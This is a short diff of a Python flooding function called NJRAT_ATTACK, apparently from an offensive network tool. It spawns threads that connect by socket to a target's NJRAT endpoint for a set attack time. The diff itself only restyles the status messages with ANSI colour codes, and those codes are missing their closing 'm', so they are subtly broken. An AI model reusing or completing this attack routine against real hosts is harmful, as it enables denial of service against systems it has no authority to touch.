@@ -38,7 +38,7 @@ def NJRAT_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
+	print('\033[1;34'+"[*]"+'\033[0m'+" Attack started for " + str(attack_time) + " seconds...")
 	
 
 	threads_list = []
@@ -57,7 +57,7 @@ def NJRAT_ATTACK(threads, attack_time, target):
 				sock.connect((target_ip, target_port))
 			except Exception as e:
 				print(e)
-				print("[ERROR] Failed connect to target`s NJRAT!")
+				print('\033[1;31'+"[-]"+'\033[0m'+" Failed connect to target`s NJRAT!")
 				exit()
 				
 			try:
@@ -67,11 +67,11 @@ def NJRAT_ATTACK(threads, attack_time, target):
 				time.sleep(0.25)
 				continue
 			else:
-				print("[SUCCESS] NJRAT client connected!")      
+				print('\033[1;32'+"[+]"+'\033[0m'+" NJRAT client connected!")      
 
 	# Start threads
 	for thread in range(threads):
-		print("[BEGIN] Staring thread " + str(thread) + "...")
+		print('\033[1;34'+"[*]"+'\033[0m'+" Staring thread " + str(thread) + "...")
 		t = Thread(target = njrat_flood)
 		t.start()
 		threads_list.append(t)
@@ -84,4 +84,4 @@ def NJRAT_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[WARNING] NJRAT attack stopped!")
+	print('\033[1;33'+"[!]"+'\033[0m'+" NJRAT attack stopped!")
